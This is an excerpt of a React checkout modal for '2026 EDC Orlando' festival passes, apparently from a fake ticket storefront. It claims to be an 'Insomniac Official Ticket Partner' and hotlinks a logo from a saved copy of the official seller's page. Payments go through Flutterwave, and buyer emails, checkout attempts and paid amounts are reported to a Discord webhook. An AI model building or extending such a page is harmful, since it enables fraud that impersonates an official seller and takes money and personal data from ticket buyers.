...
type EDCCheckoutModalProps = {
  item: EDCTicketItem | null;
  onClose: () => void;
};

export function EDCCheckoutModal({ item, onClose }: EDCCheckoutModalProps) {
  ...
  const handleCheckout = async (e: React.FormEvent) => {
    ...
    try {
      ...
      await fetch('/api/notifications/discord', {
        ...
        body: JSON.stringify({
          type: 'inquiry',
          content: '⚡ **2026 EDC Orlando Ticket Checkout Attempt**',
          embeds: [
            {
              ...
              fields: [
                ...
                { name: 'Price per Pass', value: `$${item.price.toFixed(2)}`, inline: true },
                { name: 'Quantity', value: quantity.toString(), inline: true },
                { name: 'Total Amount', value: `$${totalPrice.toFixed(2)}`, inline: true },
      ...
      (window as any).FlutterwaveCheckout({
        ...
        customizations: {
          title: 'EDC Orlando 2026 Checkout',
          description: `Payment for ${quantity}x ${item.name}`,
          logo: 'https://edcorlando.frontgatetickets.com/EDC%20Orlando_files/header.png',
        },
        meta: {
          price_per_ticket: `$${item.price.toFixed(2)}`,
          event: '2026 EDC Orlando',
          pass_type: item.name,
          ...
          if (response.status === 'successful' || response.status === 'completed') {
            const processPayment = async () => {
              ...
              await fetch('/api/notifications/discord', {
                ...
                body: JSON.stringify({
                  type: 'payment',
                  content: '🎉 **2026 EDC Orlando Ticket Order Confirmed!**',
                  embeds: [
                    {
                      title: `EDC Orlando Pass Purchased: ${item.name}`,
                      description: `**Pass Tier:** ${item.name}\n**Access:** ${item.dayText} (${item.dateText})`,
                      fields: [
                        { name: 'Buyer Email', value: email, inline: true },
                        { name: 'Quantity', value: quantity.toString(), inline: true },
                        { name: 'Amount Paid', value: `$${totalPrice.toFixed(2)}`, inline: true },
      ...
      console.error('EDC Checkout error:', err);
  ...
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fadeIn">
      <div className="relative w-full max-w-xl bg-slate-900 border border-purple-500/30 rounded-3xl shadow-2xl overflow-hidden text-white my-8 max-h-[90vh] flex flex-col">
        {/* Header */}
        <div className="relative p-6 bg-gradient-to-r from-purple-900/80 via-fuchsia-900/80 to-slate-900 border-b border-purple-500/20 flex justify-between items-start">
          <div className="pr-8">
            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-purple-500/20 border border-purple-400/30 text-purple-300 font-semibold text-xs mb-2">
              <Sparkles className="w-3.5 h-3.5 text-purple-400" /> Insomniac Official Ticket Partner
            </div>
            <h3 className="text-2xl font-black text-white tracking-tight">{item.name}</h3>
            <p className="text-sm text-purple-200/80 mt-1">
              Tinker Field, Orlando, FL • {item.dayText} ({item.dateText})
            </p>
          </div>
          <button
            onClick={onClose}
            ...
            <div className="py-8 text-center space-y-6 animate-fadeIn">
              ...
              <div>
                ...
                <p className="text-slate-300 max-w-md mx-auto">
                  Your ticket pass for <span className="text-purple-300 font-bold">{item.name}</span> has been reserved. Check your email inbox for order details and digital wristband fulfillment instructions.
                </p>
              </div>
              ...
              <button
                onClick={onClose}
                className="w-full py-4 bg-gradient-to-r from-purple-600 to-cyan-500 hover:from-purple-500 hover:to-cyan-400 text-white font-bold rounded-2xl shadow-lg transition-all"
              >
                Return to EDC Orlando Festival
              </button>
            </div>
          ) : (
            <>
              ...
              <div className="bg-slate-800/60 border border-slate-700/60 rounded-2xl p-4 flex gap-4 items-center">
                ...
                <div className="flex-1">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold uppercase tracking-wider text-purple-400">{item.tier} Experience</span>
              ...
              <form onSubmit={handleCheckout} className="space-y-4">
                <div>
                  ...
                  <input
                    ...
                    className="w-full px-4 py-3.5 bg-slate-950 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-purple-500 transition-colors"
                  />
                </div>
                ...
                <button
                  ...
                  className="w-full py-4 bg-gradient-to-r from-purple-600 via-fuchsia-600 to-cyan-500 hover:from-purple-500 hover:to-cyan-400 text-white font-extrabold rounded-2xl shadow-xl hover:shadow-purple-500/25 transition-all flex items-center justify-center gap-2 disabled:opacity-50 text-base"
                >
                  {isLoading ? (
                    <>
